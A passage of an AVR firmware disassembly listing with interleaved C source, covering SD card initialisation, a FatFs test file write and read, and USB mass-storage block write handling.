    514e:	86 ea       	ldi	r24, 0xA6	; 166
    5150:	95 e0       	ldi	r25, 0x05	; 5
    5152:	9f 93       	push	r25
    5154:	8f 93       	push	r24
    5156:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
        f_unlink(file_name);
    515a:	c8 01       	movw	r24, r16
    515c:	0e 94 0e 1b 	call	0x361c	; 0x361c <f_unlink>

        uint8_t new_id = eeprom_read_byte((uint8_t*)0x69) + 3;
    5160:	89 e6       	ldi	r24, 0x69	; 105
    5162:	90 e0       	ldi	r25, 0x00	; 0
    5164:	0e 94 a2 3c 	call	0x7944	; 0x7944 <eeprom_read_byte>
    5168:	0f 2e       	mov	r0, r31
    516a:	f3 e0       	ldi	r31, 0x03	; 3
    516c:	df 2e       	mov	r13, r31
    516e:	f0 2d       	mov	r31, r0
    5170:	d8 0e       	add	r13, r24
        memset(file_name, 0, sizeof(file_name));
    5172:	88 e7       	ldi	r24, 0x78	; 120
    5174:	f8 01       	movw	r30, r16
    5176:	11 92       	st	Z+, r1
    5178:	8a 95       	dec	r24
    517a:	e9 f7       	brne	.-6      	; 0x5176 <sdcard_create_sdload_times_file+0xb6>

        sprintf(file_name, FILE_NAM_TEMPLATE, new_id);
    517c:	1f 92       	push	r1
    517e:	df 92       	push	r13
    5180:	ff 92       	push	r15
    5182:	ef 92       	push	r14
    5184:	1f 93       	push	r17
    5186:	0f 93       	push	r16
    5188:	0e 94 b4 39 	call	0x7368	; 0x7368 <sprintf>
        sprintf(line, "sd load nr times: 0x%02X\r\n", new_id);
    518c:	1f 92       	push	r1
    518e:	df 92       	push	r13
    5190:	84 ec       	ldi	r24, 0xC4	; 196
    5192:	95 e0       	ldi	r25, 0x05	; 5
    5194:	9f 93       	push	r25
    5196:	8f 93       	push	r24
    5198:	ce 01       	movw	r24, r28
    519a:	84 55       	subi	r24, 0x54	; 84
    519c:	9d 4f       	sbci	r25, 0xFD	; 253
    519e:	9f 93       	push	r25
    51a0:	8f 93       	push	r24
    51a2:	0e 94 b4 39 	call	0x7368	; 0x7368 <sprintf>
        eeprom_write_byte((uint8_t*)0x69, new_id);
    51a6:	6d 2d       	mov	r22, r13
    51a8:	89 e6       	ldi	r24, 0x69	; 105
    51aa:	90 e0       	ldi	r25, 0x00	; 0
    51ac:	0e 94 b3 3c 	call	0x7966	; 0x7966 <eeprom_write_byte>

        printf("opening: %s\r\n", file_name);
    51b0:	1f 93       	push	r17
    51b2:	0f 93       	push	r16
    51b4:	8f ed       	ldi	r24, 0xDF	; 223
    51b6:	95 e0       	ldi	r25, 0x05	; 5
    51b8:	9f 93       	push	r25
    51ba:	8f 93       	push	r24
    51bc:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
        fr = f_open(&file1, file_name, FA_CREATE_ALWAYS | FA_WRITE | FA_READ);
    51c0:	4b e0       	ldi	r20, 0x0B	; 11
    51c2:	b8 01       	movw	r22, r16
    51c4:	ce 01       	movw	r24, r28
    51c6:	8c 5d       	subi	r24, 0xDC	; 220
    51c8:	9c 4f       	sbci	r25, 0xFC	; 252
    51ca:	0e 94 ac 15 	call	0x2b58	; 0x2b58 <f_open>
    51ce:	f8 2e       	mov	r15, r24
        if (fr == FR_OK)
    51d0:	0f b6       	in	r0, 0x3f	; 63
    51d2:	f8 94       	cli
    51d4:	de bf       	out	0x3e, r29	; 62
    51d6:	0f be       	out	0x3f, r0	; 63
    51d8:	cd bf       	out	0x3d, r28	; 61
    51da:	f1 10       	cpse	r15, r1
    51dc:	80 c0       	rjmp	.+256    	; 0x52de <sdcard_create_sdload_times_file+0x21e>
        {
            printf("file open success \r\n");
    51de:	8d ee       	ldi	r24, 0xED	; 237
    51e0:	95 e0       	ldi	r25, 0x05	; 5
    51e2:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
            printf("disk mounted and file opened \r\n");
    51e6:	81 e0       	ldi	r24, 0x01	; 1
    51e8:	96 e0       	ldi	r25, 0x06	; 6
    51ea:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
            printf("writing: %s\r\n", line);
    51ee:	05 55       	subi	r16, 0x55	; 85
    51f0:	1d 4f       	sbci	r17, 0xFD	; 253
    51f2:	1f 93       	push	r17
    51f4:	0f 93       	push	r16
    51f6:	80 e2       	ldi	r24, 0x20	; 32
    51f8:	96 e0       	ldi	r25, 0x06	; 6
    51fa:	9f 93       	push	r25
    51fc:	8f 93       	push	r24
    51fe:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
            f_write(&file1, line, strlen(line), &bw);
    5202:	f8 01       	movw	r30, r16
    5204:	01 90       	ld	r0, Z+
    5206:	00 20       	and	r0, r0
    5208:	e9 f7       	brne	.-6      	; 0x5204 <sdcard_create_sdload_times_file+0x144>
    520a:	31 97       	sbiw	r30, 0x01	; 1
    520c:	af 01       	movw	r20, r30
    520e:	40 1b       	sub	r20, r16
    5210:	51 0b       	sbc	r21, r17
    5212:	9e 01       	movw	r18, r28
    5214:	2a 5b       	subi	r18, 0xBA	; 186
    5216:	3c 4f       	sbci	r19, 0xFC	; 252
    5218:	b8 01       	movw	r22, r16
    521a:	ce 01       	movw	r24, r28
    521c:	8c 5d       	subi	r24, 0xDC	; 220
    521e:	9c 4f       	sbci	r25, 0xFC	; 252
    5220:	0e 94 b5 18 	call	0x316a	; 0x316a <f_write>
            if (fr == FR_OK)
    5224:	0f 90       	pop	r0
    5226:	0f 90       	pop	r0
    5228:	0f 90       	pop	r0
    522a:	0f 90       	pop	r0
    522c:	f1 10       	cpse	r15, r1
    522e:	51 c0       	rjmp	.+162    	; 0x52d2 <sdcard_create_sdload_times_file+0x212>
            {
                printf("file write success \r\n");
    5230:	8e e2       	ldi	r24, 0x2E	; 46
    5232:	96 e0       	ldi	r25, 0x06	; 6
    5234:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
                f_close(&file1);
    5238:	ce 01       	movw	r24, r28
    523a:	8c 5d       	subi	r24, 0xDC	; 220
    523c:	9c 4f       	sbci	r25, 0xFC	; 252
    523e:	0e 94 f1 1a 	call	0x35e2	; 0x35e2 <f_close>

                printf("openning the file again for reading...\r\n");
    5242:	83 e4       	ldi	r24, 0x43	; 67
    5244:	96 e0       	ldi	r25, 0x06	; 6
    5246:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
                fr = f_open(&file1, file_name, FA_READ);
    524a:	41 e0       	ldi	r20, 0x01	; 1
    524c:	be 01       	movw	r22, r28
    524e:	6f 5f       	subi	r22, 0xFF	; 255
    5250:	7f 4f       	sbci	r23, 0xFF	; 255
    5252:	ce 01       	movw	r24, r28
    5254:	8c 5d       	subi	r24, 0xDC	; 220
    5256:	9c 4f       	sbci	r25, 0xFC	; 252
    5258:	0e 94 ac 15 	call	0x2b58	; 0x2b58 <f_open>
                if (fr == FR_OK)
    525c:	81 11       	cpse	r24, r1
    525e:	31 c0       	rjmp	.+98     	; 0x52c2 <sdcard_create_sdload_times_file+0x202>
                {
                    printf("reading content of the file\r\n");
    5260:	8b e6       	ldi	r24, 0x6B	; 107
    5262:	96 e0       	ldi	r25, 0x06	; 6
    5264:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
                    fr = f_read(&file1, line, strlen(line), &bw);
    5268:	b8 01       	movw	r22, r16
    526a:	f8 01       	movw	r30, r16
    526c:	01 90       	ld	r0, Z+
    526e:	00 20       	and	r0, r0
    5270:	e9 f7       	brne	.-6      	; 0x526c <sdcard_create_sdload_times_file+0x1ac>
    5272:	31 97       	sbiw	r30, 0x01	; 1
    5274:	af 01       	movw	r20, r30
    5276:	40 1b       	sub	r20, r16
    5278:	51 0b       	sbc	r21, r17
    527a:	9e 01       	movw	r18, r28
    527c:	2a 5b       	subi	r18, 0xBA	; 186
    527e:	3c 4f       	sbci	r19, 0xFC	; 252
    5280:	ce 01       	movw	r24, r28
    5282:	8c 5d       	subi	r24, 0xDC	; 220
    5284:	9c 4f       	sbci	r25, 0xFC	; 252
    5286:	0e 94 4a 17 	call	0x2e94	; 0x2e94 <f_read>
                    if (fr == FR_OK)
    528a:	81 11       	cpse	r24, r1
    528c:	13 c0       	rjmp	.+38     	; 0x52b4 <sdcard_create_sdload_times_file+0x1f4>
                    {
                        printf("content:\r\n%s\r\n", line);
    528e:	c8 01       	movw	r24, r16
    5290:	9f 93       	push	r25
    5292:	0f 93       	push	r16
    5294:	88 e8       	ldi	r24, 0x88	; 136
    5296:	96 e0       	ldi	r25, 0x06	; 6
    5298:	9f 93       	push	r25
    529a:	8f 93       	push	r24
    529c:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>

                        printf("\r\nsuccess!! FatFs is working good\r\n");
    52a0:	87 e9       	ldi	r24, 0x97	; 151
    52a2:	96 e0       	ldi	r25, 0x06	; 6
    52a4:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    52a8:	0f 90       	pop	r0
    52aa:	0f 90       	pop	r0
    52ac:	0f 90       	pop	r0
    52ae:	0f 90       	pop	r0
                        retf = true;
    52b0:	11 e0       	ldi	r17, 0x01	; 1
    52b2:	01 c0       	rjmp	.+2      	; 0x52b6 <sdcard_create_sdload_times_file+0x1f6>
    FATFS fs;
    char line[120] = { 0 };
    FIL file1;
    UINT bw;
    FRESULT fr;
    bool retf = false;
    52b4:	10 e0       	ldi	r17, 0x00	; 0
                        printf("content:\r\n%s\r\n", line);

                        printf("\r\nsuccess!! FatFs is working good\r\n");
                        retf = true;
                    }
                    f_close(&file1);
    52b6:	ce 01       	movw	r24, r28
    52b8:	8c 5d       	subi	r24, 0xDC	; 220
    52ba:	9c 4f       	sbci	r25, 0xFC	; 252
    52bc:	0e 94 f1 1a 	call	0x35e2	; 0x35e2 <f_close>
    52c0:	01 c0       	rjmp	.+2      	; 0x52c4 <sdcard_create_sdload_times_file+0x204>
    FATFS fs;
    char line[120] = { 0 };
    FIL file1;
    UINT bw;
    FRESULT fr;
    bool retf = false;
    52c2:	10 e0       	ldi	r17, 0x00	; 0
                        printf("\r\nsuccess!! FatFs is working good\r\n");
                        retf = true;
                    }
                    f_close(&file1);
                }
                if (!retf)
    52c4:	11 11       	cpse	r17, r1
    52c6:	16 c0       	rjmp	.+44     	; 0x52f4 <sdcard_create_sdload_times_file+0x234>
                {
                    printf("\r\nERROR!!\r\n");
    52c8:	8a eb       	ldi	r24, 0xBA	; 186
    52ca:	96 e0       	ldi	r25, 0x06	; 6
    52cc:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    52d0:	11 c0       	rjmp	.+34     	; 0x52f4 <sdcard_create_sdload_times_file+0x234>
                }
            }
            else
            {
                printf("file write error \r\n");
    52d2:	85 ec       	ldi	r24, 0xC5	; 197
    52d4:	96 e0       	ldi	r25, 0x06	; 6
    52d6:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    FATFS fs;
    char line[120] = { 0 };
    FIL file1;
    UINT bw;
    FRESULT fr;
    bool retf = false;
    52da:	10 e0       	ldi	r17, 0x00	; 0
    52dc:	0b c0       	rjmp	.+22     	; 0x52f4 <sdcard_create_sdload_times_file+0x234>
                printf("file write error \r\n");
            }
        }
        else
        {
            printf("file open error \r\n");
    52de:	88 ed       	ldi	r24, 0xD8	; 216
    52e0:	96 e0       	ldi	r25, 0x06	; 6
    52e2:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    FATFS fs;
    char line[120] = { 0 };
    FIL file1;
    UINT bw;
    FRESULT fr;
    bool retf = false;
    52e6:	10 e0       	ldi	r17, 0x00	; 0
    52e8:	05 c0       	rjmp	.+10     	; 0x52f4 <sdcard_create_sdload_times_file+0x234>
            printf("file open error \r\n");
        }
    }
    else
    {
        printf("mount error \r\n");
    52ea:	8a ee       	ldi	r24, 0xEA	; 234
    52ec:	96 e0       	ldi	r25, 0x06	; 6
    52ee:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    FATFS fs;
    char line[120] = { 0 };
    FIL file1;
    UINT bw;
    FRESULT fr;
    bool retf = false;
    52f2:	10 e0       	ldi	r17, 0x00	; 0
    {
        printf("mount error \r\n");
    }

    return retf;
}
    52f4:	81 2f       	mov	r24, r17
    52f6:	c9 5b       	subi	r28, 0xB9	; 185
    52f8:	dc 4f       	sbci	r29, 0xFC	; 252
    52fa:	0f b6       	in	r0, 0x3f	; 63
    52fc:	f8 94       	cli
    52fe:	de bf       	out	0x3e, r29	; 62
    5300:	0f be       	out	0x3f, r0	; 63
    5302:	cd bf       	out	0x3d, r28	; 61
    5304:	df 91       	pop	r29
    5306:	cf 91       	pop	r28
    5308:	1f 91       	pop	r17
    530a:	0f 91       	pop	r16
    530c:	ff 90       	pop	r15
    530e:	ef 90       	pop	r14
    5310:	df 90       	pop	r13
    5312:	08 95       	ret

00005314 <sdcard_GetNbBlocks>:

    return true;
}

uint32_t sdcard_GetNbBlocks(void)
{
    5314:	cf 93       	push	r28
    5316:	df 93       	push	r29
    5318:	00 d0       	rcall	.+0      	; 0x531a <sdcard_GetNbBlocks+0x6>
    531a:	00 d0       	rcall	.+0      	; 0x531c <sdcard_GetNbBlocks+0x8>
    531c:	cd b7       	in	r28, 0x3d	; 61
    531e:	de b7       	in	r29, 0x3e	; 62
    if (STAG_ONLYMASS == eppr_vars.curr_stage)
    5320:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5324:	83 30       	cpi	r24, 0x03	; 3
    5326:	e9 f5       	brne	.+122    	; 0x53a2 <sdcard_GetNbBlocks+0x8e>
    {
        static uint32_t CachedTotalBlocks = 0;

        DWORD ioct_rsp = 0;
    5328:	19 82       	std	Y+1, r1	; 0x01
    532a:	1a 82       	std	Y+2, r1	; 0x02
    532c:	1b 82       	std	Y+3, r1	; 0x03
    532e:	1c 82       	std	Y+4, r1	; 0x04

        if (CachedTotalBlocks != 0)
    5330:	60 91 71 09 	lds	r22, 0x0971	; 0x800971 <CachedTotalBlocks.5113>
    5334:	70 91 72 09 	lds	r23, 0x0972	; 0x800972 <CachedTotalBlocks.5113+0x1>
    5338:	80 91 73 09 	lds	r24, 0x0973	; 0x800973 <CachedTotalBlocks.5113+0x2>
    533c:	90 91 74 09 	lds	r25, 0x0974	; 0x800974 <CachedTotalBlocks.5113+0x3>
    5340:	61 15       	cp	r22, r1
    5342:	71 05       	cpc	r23, r1
    5344:	81 05       	cpc	r24, r1
    5346:	91 05       	cpc	r25, r1
    5348:	81 f5       	brne	.+96     	; 0x53aa <sdcard_GetNbBlocks+0x96>
        {
            return CachedTotalBlocks;
        }

        disk_ioctl(0, GET_SECTOR_COUNT, &ioct_rsp);
    534a:	ae 01       	movw	r20, r28
    534c:	4f 5f       	subi	r20, 0xFF	; 255
    534e:	5f 4f       	sbci	r21, 0xFF	; 255
    5350:	61 e0       	ldi	r22, 0x01	; 1
    5352:	80 e0       	ldi	r24, 0x00	; 0
    5354:	0e 94 bd 06 	call	0xd7a	; 0xd7a <disk_ioctl>

        CachedTotalBlocks = ioct_rsp;
    5358:	89 81       	ldd	r24, Y+1	; 0x01
    535a:	9a 81       	ldd	r25, Y+2	; 0x02
    535c:	2b 81       	ldd	r18, Y+3	; 0x03
    535e:	3c 81       	ldd	r19, Y+4	; 0x04
    5360:	80 93 71 09 	sts	0x0971, r24	; 0x800971 <CachedTotalBlocks.5113>
    5364:	90 93 72 09 	sts	0x0972, r25	; 0x800972 <CachedTotalBlocks.5113+0x1>
    5368:	20 93 73 09 	sts	0x0973, r18	; 0x800973 <CachedTotalBlocks.5113+0x2>
    536c:	30 93 74 09 	sts	0x0974, r19	; 0x800974 <CachedTotalBlocks.5113+0x3>
        printf_P(PSTR("SD blocks: %li\r\n"), CachedTotalBlocks);
    5370:	3f 93       	push	r19
    5372:	2f 93       	push	r18
    5374:	9f 93       	push	r25
    5376:	8f 93       	push	r24
    5378:	85 ed       	ldi	r24, 0xD5	; 213
    537a:	92 e0       	ldi	r25, 0x02	; 2
    537c:	9f 93       	push	r25
    537e:	8f 93       	push	r24
    5380:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>

        return CachedTotalBlocks;
    5384:	60 91 71 09 	lds	r22, 0x0971	; 0x800971 <CachedTotalBlocks.5113>
    5388:	70 91 72 09 	lds	r23, 0x0972	; 0x800972 <CachedTotalBlocks.5113+0x1>
    538c:	80 91 73 09 	lds	r24, 0x0973	; 0x800973 <CachedTotalBlocks.5113+0x2>
    5390:	90 91 74 09 	lds	r25, 0x0974	; 0x800974 <CachedTotalBlocks.5113+0x3>
    5394:	0f 90       	pop	r0
    5396:	0f 90       	pop	r0
    5398:	0f 90       	pop	r0
    539a:	0f 90       	pop	r0
    539c:	0f 90       	pop	r0
    539e:	0f 90       	pop	r0
    53a0:	04 c0       	rjmp	.+8      	; 0x53aa <sdcard_GetNbBlocks+0x96>
    }

    return 20479; // we only support 10MB because map size ...
    53a2:	6f ef       	ldi	r22, 0xFF	; 255
    53a4:	7f e4       	ldi	r23, 0x4F	; 79
    53a6:	80 e0       	ldi	r24, 0x00	; 0
    53a8:	90 e0       	ldi	r25, 0x00	; 0
}
    53aa:	0f 90       	pop	r0
    53ac:	0f 90       	pop	r0
    53ae:	0f 90       	pop	r0
    53b0:	0f 90       	pop	r0
    53b2:	df 91       	pop	r29
    53b4:	cf 91       	pop	r28
    53b6:	08 95       	ret

000053b8 <sdcard_Init>:

    return retf;
}

bool sdcard_Init(void)
{
    53b8:	0f 93       	push	r16
    53ba:	1f 93       	push	r17
    printf_P(PSTR("\r\n\r\n"));
    53bc:	85 e3       	ldi	r24, 0x35	; 53
    53be:	93 e0       	ldi	r25, 0x03	; 3
    53c0:	9f 93       	push	r25
    53c2:	8f 93       	push	r24
    53c4:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
    53c8:	0f 90       	pop	r0
    53ca:	0f 90       	pop	r0
    do
    {
        printf_P(PSTR("trying ... disk_initialize\r\n"));
    53cc:	88 e1       	ldi	r24, 0x18	; 24
    53ce:	93 e0       	ldi	r25, 0x03	; 3
    53d0:	9f 93       	push	r25
    53d2:	8f 93       	push	r24
    53d4:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
    } while (disk_initialize(0) != FR_OK);
    53d8:	80 e0       	ldi	r24, 0x00	; 0
    53da:	0e 94 96 06 	call	0xd2c	; 0xd2c <disk_initialize>
    53de:	0f 90       	pop	r0
    53e0:	0f 90       	pop	r0
    53e2:	81 11       	cpse	r24, r1
    53e4:	f3 cf       	rjmp	.-26     	; 0x53cc <sdcard_Init+0x14>

    printf_P(PSTR("disk_initialize success\r\n"));
    53e6:	8e ef       	ldi	r24, 0xFE	; 254
    53e8:	92 e0       	ldi	r25, 0x02	; 2
    53ea:	9f 93       	push	r25
    53ec:	8f 93       	push	r24
    53ee:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>

    printf("clearing mapblocks external memory\r\n");
    53f2:	88 ef       	ldi	r24, 0xF8	; 248
    53f4:	96 e0       	ldi	r25, 0x06	; 6
    53f6:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
    memset(map_blocks, 0, real_size_map_block);
    53fa:	86 e9       	ldi	r24, 0x96	; 150
    53fc:	9d ed       	ldi	r25, 0xDD	; 221
    53fe:	e9 e6       	ldi	r30, 0x69	; 105
    5400:	f2 e2       	ldi	r31, 0x22	; 34
    5402:	df 01       	movw	r26, r30
    5404:	9c 01       	movw	r18, r24
    5406:	1d 92       	st	X+, r1
    5408:	21 50       	subi	r18, 0x01	; 1
    540a:	30 40       	sbci	r19, 0x00	; 0
    540c:	e1 f7       	brne	.-8      	; 0x5406 <sdcard_Init+0x4e>

    sdcard_GetNbBlocks();
    540e:	82 df       	rcall	.-252    	; 0x5314 <sdcard_GetNbBlocks>

    disk_read(0, rwbff, 0, 1);
    5410:	01 e0       	ldi	r16, 0x01	; 1
    5412:	10 e0       	ldi	r17, 0x00	; 0
    5414:	20 e0       	ldi	r18, 0x00	; 0
    5416:	30 e0       	ldi	r19, 0x00	; 0
    5418:	a9 01       	movw	r20, r18
    541a:	61 ee       	ldi	r22, 0xE1	; 225
    541c:	7b e0       	ldi	r23, 0x0B	; 11
    541e:	80 e0       	ldi	r24, 0x00	; 0
    5420:	0e 94 9d 06 	call	0xd3a	; 0xd3a <disk_read>
    printf_P(PSTR("first SD sector:\r\n"));
    5424:	8b ee       	ldi	r24, 0xEB	; 235
    5426:	92 e0       	ldi	r25, 0x02	; 2
    5428:	9f 93       	push	r25
    542a:	8f 93       	push	r24
    542c:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
    uart_printhexdump(rwbff, 512);
    5430:	60 e0       	ldi	r22, 0x00	; 0
    5432:	72 e0       	ldi	r23, 0x02	; 2
    5434:	81 ee       	ldi	r24, 0xE1	; 225
    5436:	9b e0       	ldi	r25, 0x0B	; 11
    5438:	0e 94 3b 02 	call	0x476	; 0x476 <uart_printhexdump>
    printf_P(PSTR("\r\n\r\n"));
    543c:	86 ee       	ldi	r24, 0xE6	; 230
    543e:	92 e0       	ldi	r25, 0x02	; 2
    5440:	9f 93       	push	r25
    5442:	8f 93       	push	r24
    5444:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>

    if (STAG_ONLYMASS == eppr_vars.curr_stage)
    5448:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    544c:	0f 90       	pop	r0
    544e:	0f 90       	pop	r0
    5450:	0f 90       	pop	r0
    5452:	0f 90       	pop	r0
    5454:	0f 90       	pop	r0
    5456:	0f 90       	pop	r0
    5458:	83 30       	cpi	r24, 0x03	; 3
    {
        sdcard_create_sdload_times_file();
    545a:	09 f4       	brne	.+2      	; 0x545e <sdcard_Init+0xa6>
    545c:	31 de       	rcall	.-926    	; 0x50c0 <sdcard_create_sdload_times_file>
    }

    return true;
}
    545e:	81 e0       	ldi	r24, 0x01	; 1
    5460:	1f 91       	pop	r17
    5462:	0f 91       	pop	r16
    5464:	08 95       	ret

00005466 <sdcard_WriteBlockHandler>:
 *
 *  \param[in] BlockAddress  Data block starting address for the write sequence
 *  \param[in] TotalBlocks   Number of blocks of data to write
 */
uintptr_t sdcard_WriteBlockHandler(uint8_t* buff_to_write, void* a, void* p)
{
    5466:	cf 93       	push	r28
    5468:	df 93       	push	r29
    546a:	ec 01       	movw	r28, r24
			 *          on its direction.
			 */
			static inline bool Endpoint_IsReadWriteAllowed(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsReadWriteAllowed(void)
			{
				return ((UEINTX & (1 << RWAL)) ? true : false);
    546c:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    /* Check if the endpoint is currently empty */
    if (!(Endpoint_IsReadWriteAllowed()))
    5470:	85 fd       	sbrc	r24, 5
    5472:	09 c0       	rjmp	.+18     	; 0x5486 <sdcard_WriteBlockHandler+0x20>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    5474:	e8 ee       	ldi	r30, 0xE8	; 232
    5476:	f0 e0       	ldi	r31, 0x00	; 0
    5478:	80 81       	ld	r24, Z
    547a:	8b 77       	andi	r24, 0x7B	; 123
    547c:	80 83       	st	Z, r24
    {
        /* Clear the current endpoint bank */
        Endpoint_ClearOUT();

        /* Wait until the host has sent another packet */
        if (Endpoint_WaitUntilReady())
    547e:	0e 94 2e 35 	call	0x6a5c	; 0x6a5c <Endpoint_WaitUntilReady>
    5482:	81 11       	cpse	r24, r1
    5484:	25 c0       	rjmp	.+74     	; 0x54d0 <sdcard_WriteBlockHandler+0x6a>
			 *  \return Next byte in the currently selected endpoint's FIFO buffer.
			 */
			static inline uint8_t Endpoint_Read_8(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_Read_8(void)
			{
				return UEDATX;
    5486:	e1 ef       	ldi	r30, 0xF1	; 241
    5488:	f0 e0       	ldi	r31, 0x00	; 0
    548a:	80 81       	ld	r24, Z
            return 0;
        }
    }

    /* Write one 16-byte chunk of data to the dataflash */
    buff_to_write[0] = Endpoint_Read_8();
    548c:	88 83       	st	Y, r24
    548e:	80 81       	ld	r24, Z
    buff_to_write[1] = Endpoint_Read_8();
    5490:	89 83       	std	Y+1, r24	; 0x01
    5492:	80 81       	ld	r24, Z
    buff_to_write[2] = Endpoint_Read_8();
    5494:	8a 83       	std	Y+2, r24	; 0x02
    5496:	80 81       	ld	r24, Z
    buff_to_write[3] = Endpoint_Read_8();
    5498:	8b 83       	std	Y+3, r24	; 0x03
    549a:	80 81       	ld	r24, Z
    buff_to_write[4] = Endpoint_Read_8();
    549c:	8c 83       	std	Y+4, r24	; 0x04
    549e:	80 81       	ld	r24, Z
    buff_to_write[5] = Endpoint_Read_8();
    54a0:	8d 83       	std	Y+5, r24	; 0x05
    54a2:	80 81       	ld	r24, Z
    buff_to_write[6] = Endpoint_Read_8();
    54a4:	8e 83       	std	Y+6, r24	; 0x06
    54a6:	80 81       	ld	r24, Z
    buff_to_write[7] = Endpoint_Read_8();
    54a8:	8f 83       	std	Y+7, r24	; 0x07
    54aa:	80 81       	ld	r24, Z
    buff_to_write[8] = Endpoint_Read_8();
    54ac:	88 87       	std	Y+8, r24	; 0x08
    54ae:	80 81       	ld	r24, Z
    buff_to_write[9] = Endpoint_Read_8();
    54b0:	89 87       	std	Y+9, r24	; 0x09
    54b2:	80 81       	ld	r24, Z
    buff_to_write[10] = Endpoint_Read_8();
    54b4:	8a 87       	std	Y+10, r24	; 0x0a
    54b6:	80 81       	ld	r24, Z
    buff_to_write[11] = Endpoint_Read_8();
    54b8:	8b 87       	std	Y+11, r24	; 0x0b
    54ba:	80 81       	ld	r24, Z
    buff_to_write[12] = Endpoint_Read_8();
    54bc:	8c 87       	std	Y+12, r24	; 0x0c
    54be:	80 81       	ld	r24, Z
    buff_to_write[13] = Endpoint_Read_8();
    54c0:	8d 87       	std	Y+13, r24	; 0x0d
    54c2:	80 81       	ld	r24, Z
    buff_to_write[14] = Endpoint_Read_8();
    54c4:	8e 87       	std	Y+14, r24	; 0x0e
    54c6:	80 81       	ld	r24, Z
    buff_to_write[15] = Endpoint_Read_8();
    54c8:	8f 87       	std	Y+15, r24	; 0x0f

    return 16;
    54ca:	80 e1       	ldi	r24, 0x10	; 16
    54cc:	90 e0       	ldi	r25, 0x00	; 0
    54ce:	02 c0       	rjmp	.+4      	; 0x54d4 <sdcard_WriteBlockHandler+0x6e>
        Endpoint_ClearOUT();

        /* Wait until the host has sent another packet */
        if (Endpoint_WaitUntilReady())
        {
            return 0;
    54d0:	80 e0       	ldi	r24, 0x00	; 0
    54d2:	90 e0       	ldi	r25, 0x00	; 0
    buff_to_write[13] = Endpoint_Read_8();
    buff_to_write[14] = Endpoint_Read_8();
    buff_to_write[15] = Endpoint_Read_8();

    return 16;
}
    54d4:	df 91       	pop	r29
    54d6:	cf 91       	pop	r28
    54d8:	08 95       	ret

000054da <sdcard_WriteBlocks>:
extern bool disable_keyboard_hack;


void sdcard_WriteBlocks(USB_ClassInfo_MS_Device_t* MSInterfaceInfo,
                        uint32_t BlockAddress, uint16_t TotalBlocks)
{
    54da:	8f 92       	push	r8
    54dc:	9f 92       	push	r9
    54de:	af 92       	push	r10
    54e0:	bf 92       	push	r11
    54e2:	cf 92       	push	r12
    54e4:	df 92       	push	r13
    54e6:	ef 92       	push	r14
    54e8:	ff 92       	push	r15
    54ea:	0f 93       	push	r16
    54ec:	1f 93       	push	r17
    54ee:	cf 93       	push	r28
    54f0:	df 93       	push	r29
    54f2:	cd b7       	in	r28, 0x3d	; 61
    54f4:	de b7       	in	r29, 0x3e	; 62
    54f6:	c3 55       	subi	r28, 0x53	; 83
    54f8:	d1 09       	sbc	r29, r1
    54fa:	0f b6       	in	r0, 0x3f	; 63
    54fc:	f8 94       	cli
    54fe:	de bf       	out	0x3e, r29	; 62
    5500:	0f be       	out	0x3f, r0	; 63
    5502:	cd bf       	out	0x3d, r28	; 61
    5504:	6c 01       	movw	r12, r24
    5506:	4a 01       	movw	r8, r20
    5508:	5b 01       	movw	r10, r22
    550a:	79 01       	movw	r14, r18
    int i;

    printf_P(PSTR("W %li %i\r\n"), BlockAddress, TotalBlocks);
    550c:	ff 92       	push	r15
    550e:	2f 93       	push	r18
    5510:	bf 92       	push	r11
    5512:	af 92       	push	r10
    5514:	9f 92       	push	r9
    5516:	4f 93       	push	r20
    5518:	8a ec       	ldi	r24, 0xCA	; 202
    551a:	92 e0       	ldi	r25, 0x02	; 2
    551c:	9f 93       	push	r25
    551e:	8f 93       	push	r24
    5520:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>

    /* Wait until endpoint is ready before continuing */
    if (Endpoint_WaitUntilReady())
    5524:	0e 94 2e 35 	call	0x6a5c	; 0x6a5c <Endpoint_WaitUntilReady>
    5528:	0f b6       	in	r0, 0x3f	; 63
    552a:	f8 94       	cli
    552c:	de bf       	out	0x3e, r29	; 62
    552e:	0f be       	out	0x3f, r0	; 63
    5530:	cd bf       	out	0x3d, r28	; 61
    5532:	88 23       	and	r24, r24
    5534:	09 f4       	brne	.+2      	; 0x5538 <sdcard_WriteBlocks+0x5e>
    5536:	b4 c1       	rjmp	.+872    	; 0x58a0 <sdcard_WriteBlocks+0x3c6>
    5538:	c0 c1       	rjmp	.+896    	; 0x58ba <sdcard_WriteBlocks+0x3e0>

    while (TotalBlocks)
    {
        for (i = 0; i < 32; i++)
        {
            sdcard_WriteBlockHandler(rwbff + (16 * i), NULL, NULL);
